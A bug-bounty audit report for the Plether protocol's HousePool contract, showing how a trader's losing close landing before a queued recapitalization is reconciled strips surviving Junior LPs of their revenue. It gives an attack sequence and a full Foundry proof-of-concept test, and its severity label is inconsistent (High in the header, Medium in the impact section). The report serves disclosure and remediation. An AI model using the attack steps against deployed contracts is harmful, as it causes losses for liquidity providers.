# \#99356 [SC-High] Interim trading revenue bypasses surviving Junior owners while recapitalization is queued

**Submitted on Nov 13th 2026 at 10:55:36 UTC by @go4ko for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99356
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

An owner recapitalization does not immediately update Plether's waterfall; it remains pending until a later reconciliation. This creates an ordering defect when Junior principal has been wiped, Senior remains impaired, and Junior shares still exist. If a public trade realizes a loss before that queued recapitalization is reconciled, the new cash is not tagged as pending revenue because stored Senior principal is nonzero.

At the eventual reconciliation, the untagged cash restores Senior first. The queued recapitalization is applied afterward, when the Senior gap has already shrunk, so an equal amount overflows into `unassignedAssets` instead of reaching the surviving Junior owners.

The PoC compares both orderings from one reachable snapshot. With identical recovery capital and the identical losing trade:

- reconciling the recovery first gives two equal existing Junior LPs `650.137838` and `650.137842` USDG of value, followed by executable payouts of `650.123681` and `650.123684` USDG;
- allowing the trade to land first and selecting the first old LP as the `assignUnassignedAssets` receiver gives that one address the entire `1,300.681390` USDG of displaced value and a `1,300.539910` USDG payout; and
- the second old LP remains worth exactly zero and receives zero. Selecting the second LP instead would reverse their identities, not distribute the recovery pro rata.

The trader receives no benefit and bears the same loss in either branch. The result is therefore griefing: an untrusted trader can change which users receive already-realized protocol revenue.

## Vulnerability Details

### Revenue loses its source tag while Senior principal is nonzero

Every owner recapitalization is recorded in a pending claimant bucket. Trading revenue is recorded only when both stored tranche principals are zero:

```solidity
if (kind == IHousePool.ClaimantInflowKind.Recapitalization) {
    _recordPendingClaimantInflow(kind, amount);
} else if (seniorPrincipal + juniorPrincipal == 0) {
    _recordPendingClaimantInflow(kind, amount);
}
```

The affected recovery state instead has:

- surviving Junior share supply;
- `juniorPrincipal == 0`; and
- `0 < seniorPrincipal < seniorHighWaterMark`.

Consequently, a losing close increases physical and accounted pool assets but does not increase `pendingTradingRevenueAssets`. The protocol forgets that this cash is claimant revenue while the separately queued recapitalization is still waiting.

### Reconciliation processes the untagged cash in the wrong economic order

`planReconcile` reserves only the pending buckets from distributable assets:

```solidity
if (pendingBucketAssets > 0) {
    snapshot.distributable =
        snapshot.distributable > pendingBucketAssets ? snapshot.distributable - pendingBucketAssets : 0;
}
```

Because the trade cash was not added to a pending revenue bucket, it remains ordinary surplus. The planner therefore sends it through the normal revenue waterfall, which restores Senior toward its mark before Junior receives anything.

Only after that plan is stored does `_applyPendingClaimantBucketsLive` apply the pending recapitalization. `applyClaimantRecapitalizationIntent` observes the now-smaller Senior gap and moves any remainder into `unassignedAssets`:

```solidity
uint256 gap = state.waterfall.seniorHighWaterMark > state.waterfall.seniorPrincipal
    ? state.waterfall.seniorHighWaterMark - state.waterfall.seniorPrincipal
    : 0;

if (gap > 0) {
    uint256 seniorAssignedAssets = remaining > gap ? gap : remaining;
    state.waterfall.seniorPrincipal += seniorAssignedAssets;
    remaining -= seniorAssignedAssets;
}

if (remaining > 0) {
    state.unassignedAssets += remaining;
}
```

The same cash amount is therefore assigned to different owners solely because the trade occurred before rather than after the queued recovery was committed.

### Differential result from the same state

The PoC snapshots a state where Junior has been wiped, Senior remains impaired, and two equal Junior LPs still own shares. Both branches use an exact `2,794.314809` USDG recapitalization and the same V3 trade that contributes `1,300.681390` USDG.

| Observation | Recovery reconciled first | Trade executes first |
| --- | ---: | ---: |
| Trading cash received | `1,300.681390` | `1,300.681390` |
| Selected old holder value | `650.137838` | `1,300.681390` |
| Excluded old holder value | `650.137842` | `0` |
| Selected old holder payout | `650.123681` | `1,300.539910` |
| Excluded old holder payout | `650.123684` | `0` |

In the control branch, reconciliation first uses the owner recovery to restore Senior. The later trade revenue then follows the surviving claimant path and belongs to Junior.

In the reordered branch, the same trade revenue restores Senior before the pending recapitalization is applied. The matching recapitalization remainder becomes ownerless. The PoC calls `assignUnassignedAssets(false, SELECTED_JUNIOR_HOLDER)`, which consumes the entire ownerless balance and mints all matching Junior shares to that one existing holder. The other equal old holder remains at zero. Passing the other holder as `receiver` would merely swap the winner and loser; the single-receiver operation has no pro-rata restoration path.

### The timing window does not require outracing an LP settlement

`recapitalizePool` queues accounting intent but does not reconcile it. In the PoC, no LP request remains mature after the wipe settlement. Immediately after recapitalization, a permissionless `settleLpEpoch` call reverts with `HousePool__NoLpEpochProgress`, leaving the full recapitalization pending.

A new LP request must wait for the real one-hour epoch maturity, whereas the untrusted trader can commit and execute the V3 losing trade through ordinary public entry points. Thus the tested window exists whenever governance recapitalizes without an already-mature request; the attacker does not need malicious governance or privileged transaction ordering.

### Broken ownership rule

`ACCOUNTING_SPEC.md` says that source semantics determine ownership and that only value with no safe claimant path should enter `unassignedAssets`. Here Junior shares survive and are the safe claimant path demonstrated by the control branch. Nevertheless, the reordered branch places an amount equal to the trading revenue into the ownerless bucket.

The reference invariant `test_Reachability_RecapitalizationRestoresSeniorAndReservesSurplusBeforeNewRevenue` likewise expects recapitalization to restore Senior before later revenue reaches Junior. The implementation produces that outcome only if a reconciliation happens between the same two inflows.

### Relation to the MED-12 repair

The contest permits a previously fixed root to be reported when the frozen fix is incomplete or introduces a new bug. MED-12 repaired the case where stored `S = J = 0`, causing recapitalization and revenue to be processed together by the pending-bucket helper. This path starts with nonzero stored Senior principal. The predicate in `recordClaimantInflow` therefore prevents the later revenue from entering that repaired helper at all.

This is the uncovered state around the repair: the intended recapitalization-before-revenue ordering still depends on an intervening reconciliation when Senior is impaired but nonzero.

### Attack sequence

1. A real trading loss wipes Junior principal and impairs Senior while both tranche share supplies survive.
2. Governance legitimately calls `recapitalizePool` for the exact Senior restoration gap. No LP request is currently mature, so the queued recovery cannot yet be committed by a permissionless settlement.
3. Before a new LP epoch matures, an untrusted trader closes a losing position. The cash enters the pool but is not tagged as pending trading revenue.
4. The next reconciliation uses that cash to restore Senior, then moves the equivalent overflow from the pending recapitalization into `unassignedAssets`.
5. Governance follows the documented ownerless-asset recovery path. All bootstrap shares go to one selected receiver while every other surviving Junior holder retains no claim.

The attacker neither controls governance nor earns the displaced value. Its ability to impose the loss without profit is the in-scope griefing impact.

## Impact Details

The victim loses realized revenue, not a hypothetical quote. In the control branch, the second equal Junior LP completes `claimRedeem` and receives `650.123684` USDG. From the identical snapshot with identical recovery capital, price updates, and losing trade, the reordered branch consumes all of that holder's shares and pays exactly zero USDG.

The displaced amount scales with trading revenue up to the remaining Senior impairment. It is not destroyed, but the protocol reclassifies it as ownerless and cannot return it pro rata to the existing Junior owners through the single-receiver `assignUnassignedAssets` operation. The new two-holder assertions prove this directly:

```solidity
assertEq(
    reordered.excludedHolderValue, 0, "single-receiver assignment cannot restore the other holder pro rata"
);
assertGt(reordered.selectedHolderPaid, 1_200e6);
assertEq(reordered.excludedHolderPaid, 0, "the excluded old Junior holder receives no USDG");
```

The selected old holder withdraws `1,300.539910` USDG, while the other equally funded old holder withdraws zero.

This matches the competition's Medium impact: “Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol).”

## Recommendation

When a recapitalization bucket is pending, preserve the source tag for later Revenue even if stored Senior principal is nonzero. For example, extend the revenue-queue predicate to include `pendingRecapitalizationAssets > 0`. The shared pending-bucket logic can then enforce recapitalization before revenue regardless of whether an LP reconciliation occurs between the two inflows.

Alternatively, make reconciliation apply pending recapitalization intent before distributing any unreserved surplus. Add a differential invariant asserting that the same recapitalization and later revenue produce the same tranche ownership with or without an intermediate reconciliation.

## References

- [`HousePool.recordClaimantInflow`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L624-L651)
- [`HousePool.assignUnassignedAssets`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L660-L704)
- [`HousePool._reconcile`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1555-L1599)
- [`HousePoolReconcilePlanLib.planReconcile`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolReconcilePlanLib.sol#L47-L106)
- [`HousePoolPendingPreviewLib.applyClaimantRecapitalizationIntent`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol#L111-L137)
- [`CfdEngine.recapitalizePool`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L632-L653)
- [`ACCOUNTING_SPEC.md` ownership routing](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md#L627-L650)
- [Reference recapitalization/revenue invariant](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/test/perps/invariant/properties/PerpWaterfallReferenceInvariant.t.sol#L309-L322)
- [Cecuro MED-12](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/plether-ai-audit-report-2026-10-26.pdf)

## Proof of Concept

## Proof of Concept

The PoC uses public V3 `commitOrder` and `executeOrder`, asynchronous vault entry points, permissionless `settleLpEpoch`, the real one-hour LP epochs and cooldowns, and the release 40% skew, 1,000 USDG minimum open-notional, and 40M/80% Senior settings. The owner only invokes `recapitalizePool` and `assignUnassignedAssets`, both documented recovery operations.

Only Pyth updates and USDG are mocked, as the contest permits. There is no `vm.store`, direct pool donation, in-scope contract impersonation, forged in-scope balance, or legacy Router entry point. `vm.snapshotState` is used only to compare the two mutually exclusive orderings from one reachable state.

Save the following file as `packages/perps/test/perps/regression/QueuedRecoveryRevenueOrdering.t.sol`:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {console2} from "forge-std/console2.sol";

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";

/// @notice A losing trade arriving while an owner recovery is queued changes who owns the
///         same revenue. The control and reordered paths start from one reachable snapshot.
contract QueuedRecoveryRevenueOrderingTest is BasePerpTest {

    address internal constant SELECTED_JUNIOR_HOLDER = address(0xD2901);
    address internal constant EXCLUDED_JUNIOR_HOLDER = address(0xD2908);
    address internal constant SENIOR_PROVIDER = address(0xD2902);
    address internal constant IMPAIRMENT_TRADER = address(0xD2903);
    address internal constant LOSS_TRADER = address(0xD2904);
    address internal constant COVENANT_PROVIDER = address(0xD2905);
    address internal constant EXECUTOR = address(0xD2906);
    address internal constant JUNIOR_SEED_RECEIVER = address(0xD2907);

    uint256 internal constant PAR_PRICE = 1e8;
    uint256 internal constant JUNIOR_DEPOSIT_PER_HOLDER = 1600e6;
    uint256 internal constant SENIOR_DEPOSIT = 12_400e6;
    uint256 internal constant IMPAIRMENT_SIZE = 6000e18;
    uint256 internal constant IMPAIRMENT_MARGIN = 300e6;
    uint256 internal constant REVENUE_SIZE = 1300e18;
    uint256 internal constant REVENUE_MARGIN = 1950e6;
    uint256 internal constant COVENANT_LIQUIDITY = 3900e6;

    struct BaselineOutcome {
        uint256 revenueReceived;
        uint256 selectedHolderValue;
        uint256 excludedHolderValue;
        uint256 selectedHolderPaid;
        uint256 excludedHolderPaid;
    }

    struct ReorderedOutcome {
        uint256 revenueReceived;
        uint256 selectedHolderValue;
        uint256 excludedHolderValue;
        uint256 selectedHolderPaid;
        uint256 excludedHolderPaid;
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _juniorSeedReceiver() internal pure override returns (address) {
        return JUNIOR_SEED_RECEIVER;
    }

    function setUp() public override {
        super.setUp();
        _setSeniorCapacity(40_000_000e6, 8000);

        IOrderRouterAdminHost.RouterConfig memory config = _routerConfig();
        config.minOpenNotionalAssets = 1000e6;
        _setRouterConfig(config);
        vm.warp(vm.getBlockTimestamp() + 1 days);
    }

    function test_TradingBeforeQueuedRecoveryReconcileErasesJuniorRevenue() public {
        _establishJuniorWipeAndSeniorGap();

        uint256 recoveryAssets = pool.seniorHighWaterMark() - pool.seniorPrincipal();
        assertGt(recoveryAssets, REVENUE_SIZE / 1e12, "Senior gap must cover the later trading loss");
        uint256 selectedHolderShares = juniorVault.balanceOf(SELECTED_JUNIOR_HOLDER);
        uint256 excludedHolderShares = juniorVault.balanceOf(EXCLUDED_JUNIOR_HOLDER);
        assertGt(selectedHolderShares, 0);
        assertGt(excludedHolderShares, 0);

        uint256 commonState = vm.snapshotState();
        BaselineOutcome memory baseline =
            this.runRecoveryBeforeRevenue(recoveryAssets, selectedHolderShares, excludedHolderShares);

        assertTrue(vm.revertToState(commonState));
        ReorderedOutcome memory reordered =
            this.runRevenueBeforeRecoveryReconcile(recoveryAssets, selectedHolderShares, excludedHolderShares);

        _assertDifferentialAndLog(recoveryAssets, baseline, reordered);
    }

    function _assertDifferentialAndLog(
        uint256 recoveryAssets,
        BaselineOutcome memory baseline,
        ReorderedOutcome memory reordered
    ) internal pure {
        assertEq(baseline.revenueReceived, reordered.revenueReceived, "both orderings use identical trade revenue");
        assertGt(baseline.selectedHolderValue, 600e6, "control must value the first surviving Junior holder");
        assertGt(baseline.excludedHolderValue, 600e6, "control must value the second surviving Junior holder");
        assertEq(
            reordered.excludedHolderValue, 0, "single-receiver assignment cannot restore the other holder pro rata"
        );
        assertEq(reordered.excludedHolderPaid, 0, "the excluded old Junior holder receives no USDG");
        assertGt(
            baseline.excludedHolderPaid - reordered.excludedHolderPaid,
            600e6,
            "ordering destroys the excluded holder's pro-rata payout"
        );

        console2.log("queued owner recovery (atoms)", recoveryAssets);
        console2.log("same trading revenue (atoms)", reordered.revenueReceived);
        console2.log("control selected-holder value (atoms)", baseline.selectedHolderValue);
        console2.log("control excluded-holder value (atoms)", baseline.excludedHolderValue);
        console2.log("control selected-holder payout (atoms)", baseline.selectedHolderPaid);
        console2.log("control excluded-holder payout (atoms)", baseline.excludedHolderPaid);
        console2.log("reordered selected receiver value (atoms)", reordered.selectedHolderValue);
        console2.log("reordered excluded holder value (atoms)", reordered.excludedHolderValue);
        console2.log("reordered selected receiver payout (atoms)", reordered.selectedHolderPaid);
        console2.log("reordered excluded holder payout (atoms)", reordered.excludedHolderPaid);
    }

    function runRecoveryBeforeRevenue(
        uint256 recoveryAssets,
        uint256 selectedHolderShares,
        uint256 excludedHolderShares
    ) external returns (BaselineOutcome memory outcome) {
        _queueOwnerRecovery(recoveryAssets);
        _reconcileQueuedRecoveryWithRefund();

        uint256 cashBefore = pool.totalAssets();
        _realizeIdenticalTradingRevenue();
        outcome.revenueReceived = pool.totalAssets() - cashBefore;
        (, uint256 previewJunior) = pool.getPendingDepositTrancheState();

        outcome.selectedHolderValue = juniorVault.convertToAssets(selectedHolderShares);
        outcome.excludedHolderValue = juniorVault.convertToAssets(excludedHolderShares);
        assertGt(outcome.revenueReceived, 1200e6);
        assertGt(previewJunior, 1200e6, "later revenue belongs to surviving Junior");
        assertGt(outcome.selectedHolderValue, 600e6);
        assertGt(outcome.excludedHolderValue, 600e6);

        _depositThroughVault(juniorVault, COVENANT_PROVIDER, COVENANT_LIQUIDITY, CAP_PRICE);
        _finishCooldown(juniorVault, SELECTED_JUNIOR_HOLDER);
        _finishCooldown(juniorVault, EXCLUDED_JUNIOR_HOLDER);
        uint256 selectedRedeemId = _requestAll(juniorVault, SELECTED_JUNIOR_HOLDER);
        uint256 excludedRedeemId = _requestAll(juniorVault, EXCLUDED_JUNIOR_HOLDER);
        assertEq(excludedRedeemId, selectedRedeemId, "both old holders must settle in the same epoch");
        _advanceToEpoch(selectedRedeemId);
        _settleEpochAt(CAP_PRICE);

        outcome.selectedHolderPaid = _claimFundedRedemption(juniorVault, selectedRedeemId, SELECTED_JUNIOR_HOLDER);
        outcome.excludedHolderPaid = _claimFundedRedemption(juniorVault, excludedRedeemId, EXCLUDED_JUNIOR_HOLDER);
    }

    function runRevenueBeforeRecoveryReconcile(
        uint256 recoveryAssets,
        uint256 selectedHolderShares,
        uint256 excludedHolderShares
    ) external returns (ReorderedOutcome memory outcome) {
        _queueOwnerRecovery(recoveryAssets);

        // With no matured LP request, even a permissionless caller cannot commit the queued
        // recovery. A new request needs an hour, while the public V3 trade executes immediately.
        bytes[] memory noProgressData = _mockPythUpdateData(CAP_PRICE);
        vm.prank(EXECUTOR);
        vm.expectRevert(IHousePool.HousePool__NoLpEpochProgress.selector);
        router.settleLpEpoch(noProgressData);
        assertEq(pool.pendingRecapitalizationAssets(), recoveryAssets);

        uint256 cashBefore = pool.totalAssets();
        _realizeIdenticalTradingRevenue();
        outcome.revenueReceived = pool.totalAssets() - cashBefore;

        (, uint256 previewJunior) = pool.getPendingDepositTrancheState();
        assertEq(pool.pendingRecapitalizationAssets(), recoveryAssets);
        assertEq(pool.pendingTradingRevenueAssets(), 0, "nonzero Senior leaves Revenue untagged");
        assertEq(previewJunior, 0, "preview already removes the surviving Junior claim");
        assertGt(outcome.revenueReceived, 1200e6);

        uint256 selectedSharesBefore = juniorVault.balanceOf(SELECTED_JUNIOR_HOLDER);
        pool.assignUnassignedAssets(false, SELECTED_JUNIOR_HOLDER);
        uint256 bootstrapShares = juniorVault.balanceOf(SELECTED_JUNIOR_HOLDER) - selectedSharesBefore;

        assertEq(selectedSharesBefore, selectedHolderShares, "selected holder begins with only old Junior shares");
        assertEq(juniorVault.balanceOf(EXCLUDED_JUNIOR_HOLDER), excludedHolderShares);
        outcome.selectedHolderValue = juniorVault.convertToAssets(juniorVault.balanceOf(SELECTED_JUNIOR_HOLDER));
        outcome.excludedHolderValue = juniorVault.convertToAssets(excludedHolderShares);
        assertEq(
            juniorVault.convertToAssets(bootstrapShares),
            outcome.revenueReceived,
            "new shares give the selected receiver all displaced revenue"
        );
        assertEq(
            outcome.selectedHolderValue, outcome.revenueReceived, "selected old holder receives the entire assignment"
        );
        assertEq(outcome.excludedHolderValue, 0, "the other old holder remains diluted to zero");
        assertEq(pool.unassignedAssets(), 0);

        _depositThroughVault(juniorVault, COVENANT_PROVIDER, COVENANT_LIQUIDITY, CAP_PRICE);
        _finishCooldown(juniorVault, SELECTED_JUNIOR_HOLDER);
        _finishCooldown(juniorVault, EXCLUDED_JUNIOR_HOLDER);

        uint256 selectedRedeemId = _requestAll(juniorVault, SELECTED_JUNIOR_HOLDER);
        uint256 excludedRedeemId = _requestAll(juniorVault, EXCLUDED_JUNIOR_HOLDER);
        assertEq(excludedRedeemId, selectedRedeemId, "both old holders must settle in the same epoch");
        _advanceToEpoch(selectedRedeemId);
        _settleEpochAt(CAP_PRICE);

        uint256 selectedWalletBefore = settlementToken.balanceOf(SELECTED_JUNIOR_HOLDER);
        outcome.selectedHolderPaid = _claimPossiblyZero(juniorVault, selectedRedeemId, SELECTED_JUNIOR_HOLDER);
        assertEq(settlementToken.balanceOf(SELECTED_JUNIOR_HOLDER) - selectedWalletBefore, outcome.selectedHolderPaid);
        assertGt(outcome.selectedHolderPaid, 1200e6);

        uint256 excludedWalletBefore = settlementToken.balanceOf(EXCLUDED_JUNIOR_HOLDER);
        outcome.excludedHolderPaid = _claimPossiblyZero(juniorVault, excludedRedeemId, EXCLUDED_JUNIOR_HOLDER);
        assertEq(settlementToken.balanceOf(EXCLUDED_JUNIOR_HOLDER), excludedWalletBefore);
        assertEq(juniorVault.balanceOf(EXCLUDED_JUNIOR_HOLDER), 0);
        assertEq(juniorVault.pendingRedeemRequest(excludedRedeemId, EXCLUDED_JUNIOR_HOLDER), 0);
        assertEq(juniorVault.refundableRedeemRequest(excludedRedeemId, EXCLUDED_JUNIOR_HOLDER), 0);
    }

    function _establishJuniorWipeAndSeniorGap() internal {
        _depositThroughVault(juniorVault, SELECTED_JUNIOR_HOLDER, JUNIOR_DEPOSIT_PER_HOLDER, PAR_PRICE);
        _depositThroughVault(juniorVault, EXCLUDED_JUNIOR_HOLDER, JUNIOR_DEPOSIT_PER_HOLDER, PAR_PRICE);
        _depositThroughVault(seniorVault, SENIOR_PROVIDER, SENIOR_DEPOSIT, PAR_PRICE);

        _fundTrader(IMPAIRMENT_TRADER, IMPAIRMENT_MARGIN + 60e6);
        _executeOrder(IMPAIRMENT_TRADER, CfdTypes.Side.SHORT, IMPAIRMENT_SIZE, IMPAIRMENT_MARGIN, false, PAR_PRICE);
        _executeOrder(IMPAIRMENT_TRADER, CfdTypes.Side.SHORT, IMPAIRMENT_SIZE, 0, true, CAP_PRICE);

        (uint256 wipeId,) = _queueSelectedJuniorForRefund();
        _advanceToEpoch(wipeId);
        _settleEpochAt(CAP_PRICE);
        _claimSelectedJuniorRefund(wipeId);

        assertEq(pool.juniorPrincipal(), 0);
        assertGt(pool.seniorPrincipal(), 0);
        assertLt(pool.seniorPrincipal(), pool.seniorHighWaterMark());
        assertGt(juniorVault.balanceOf(SELECTED_JUNIOR_HOLDER), 0, "first Junior holder survives the wipe");
        assertGt(juniorVault.balanceOf(EXCLUDED_JUNIOR_HOLDER), 0, "second Junior holder survives the wipe");
        assertEq(juniorVault.convertToAssets(juniorVault.balanceOf(SELECTED_JUNIOR_HOLDER)), 0);
        assertEq(juniorVault.convertToAssets(juniorVault.balanceOf(EXCLUDED_JUNIOR_HOLDER)), 0);
    }

    function _realizeIdenticalTradingRevenue() internal {
        _fundTrader(LOSS_TRADER, REVENUE_MARGIN + 120e6);
        _executeOrder(LOSS_TRADER, CfdTypes.Side.LONG, REVENUE_SIZE, REVENUE_MARGIN, false, PAR_PRICE);
        _executeOrder(LOSS_TRADER, CfdTypes.Side.LONG, REVENUE_SIZE, 0, true, CAP_PRICE);
    }

    function _queueOwnerRecovery(
        uint256 assets
    ) internal {
        settlementToken.mint(address(this), assets);
        settlementToken.approve(address(engine), assets);
        engine.recapitalizePool(assets);
    }

    function _reconcileQueuedRecoveryWithRefund() internal {
        (uint256 requestId,) = _queueSelectedJuniorForRefund();
        _advanceToEpoch(requestId);
        _settleEpochAt(CAP_PRICE);
        _claimSelectedJuniorRefund(requestId);
        assertEq(pool.pendingRecapitalizationAssets(), 0);
        assertEq(pool.seniorPrincipal(), pool.seniorHighWaterMark());
        assertEq(pool.juniorPrincipal(), 0);
    }

    function _depositThroughVault(
        TrancheVault vault,
        address lp,
        uint256 assets,
        uint256 markPrice
    ) internal {
        settlementToken.mint(lp, assets);
        vm.startPrank(lp);
        settlementToken.approve(address(vault), assets);
        uint256 requestId = vault.requestDeposit(assets, lp, lp);
        vm.stopPrank();

        _advanceToEpoch(requestId);
        _settleEpochAt(markPrice);
        uint256 claimable = vault.claimableDepositRequest(requestId, lp);
        vm.prank(lp);
        assertGt(vault.claimDeposit(requestId, claimable, lp, lp), 0);
    }

    function _executeOrder(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose,
        uint256 price
    ) internal returns (uint64 orderId) {
        uint256 window = router.maxExecutionWindowSeconds();
        OrderV3Types.OrderRequest memory request;
        request.clientOrderId = bytes32(uint256(router.nextCommitId()) + 0xD2900000);
        request.side = side;
        request.sizeDelta = size;
        request.marginDelta = margin;
        request.targetPrice = price;
        request.isClose = isClose;
        request.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(vm.getBlockTimestamp() + window),
            executionWindowSeconds: uint32(window),
            allowedExecutionModes: 7,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });

        vm.prank(account);
        orderId = router.commitOrder(request);
        bytes[] memory updateData = _mockPythUpdateData(price);
        vm.prank(EXECUTOR);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, updateData);
        assertEq(result.orderId, orderId);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed));
    }

    function _settleEpochAt(
        uint256 price
    ) internal {
        bytes[] memory updateData = _mockPythUpdateData(price);
        vm.prank(EXECUTOR);
        router.settleLpEpoch(updateData);
    }

    function _queueSelectedJuniorForRefund() internal returns (uint256 requestId, uint256 shares) {
        _finishCooldown(juniorVault, SELECTED_JUNIOR_HOLDER);
        shares = juniorVault.balanceOf(SELECTED_JUNIOR_HOLDER);
        assertGt(shares, 0);
        vm.prank(SELECTED_JUNIOR_HOLDER);
        requestId = juniorVault.requestRedeem(shares, SELECTED_JUNIOR_HOLDER, SELECTED_JUNIOR_HOLDER);
    }

    function _claimSelectedJuniorRefund(
        uint256 requestId
    ) internal {
        uint256 shares = juniorVault.refundableRedeemRequest(requestId, SELECTED_JUNIOR_HOLDER);
        assertGt(shares, 0);
        vm.prank(SELECTED_JUNIOR_HOLDER);
        assertEq(juniorVault.claimRedeemRefund(requestId, SELECTED_JUNIOR_HOLDER, SELECTED_JUNIOR_HOLDER), shares);
    }

    function _requestAll(
        TrancheVault vault,
        address lp
    ) internal returns (uint256 requestId) {
        uint256 shares = vault.balanceOf(lp);
        assertGt(shares, 0);
        vm.prank(lp);
        requestId = vault.requestRedeem(shares, lp, lp);
    }

    function _claimFundedRedemption(
        TrancheVault vault,
        uint256 requestId,
        address lp
    ) internal returns (uint256 assets) {
        uint256 shares = vault.claimableRedeemRequest(requestId, lp);
        assertGt(shares, 0);
        vm.prank(lp);
        assets = vault.claimRedeem(requestId, shares, lp, lp);
        assertGt(assets, 0);
    }

    function _claimPossiblyZero(
        TrancheVault vault,
        uint256 requestId,
        address lp
    ) internal returns (uint256 assets) {
        uint256 shares = vault.claimableRedeemRequest(requestId, lp);
        vm.prank(lp);
        assets = vault.claimRedeem(requestId, shares, lp, lp);
    }

    function _finishCooldown(
        TrancheVault vault,
        address lp
    ) internal {
        uint256 ready = vault.lastDepositTime(lp) + vault.DEPOSIT_COOLDOWN();
        if (vm.getBlockTimestamp() < ready) {
            vm.warp(ready);
        }
    }

    function _advanceToEpoch(
        uint256 requestId
    ) internal {
        uint256 maturity = pool.lpEpochStart(requestId);
        if (vm.getBlockTimestamp() < maturity) {
            vm.warp(maturity);
        }
    }

}
```

Run:

```sh
forge test --root packages/perps \
  --match-path test/perps/regression/QueuedRecoveryRevenueOrdering.t.sol -vv
```

Expected result:

```text
Ran 1 test for test/perps/regression/QueuedRecoveryRevenueOrdering.t.sol:QueuedRecoveryRevenueOrderingTest
[PASS] test_TradingBeforeQueuedRecoveryReconcileErasesJuniorRevenue()
Logs:
  queued owner recovery (atoms) 2794314809
  same trading revenue (atoms) 1300681390
  control selected-holder value (atoms) 650137838
  control excluded-holder value (atoms) 650137842
  control selected-holder payout (atoms) 650123681
  control excluded-holder payout (atoms) 650123684
  reordered selected receiver value (atoms) 1300681390
  reordered excluded holder value (atoms) 0
  reordered selected receiver payout (atoms) 1300539910
  reordered excluded holder payout (atoms) 0

Suite result: ok. 1 passed; 0 failed; 0 skipped
```

All logged values are USDG atoms with six decimals.
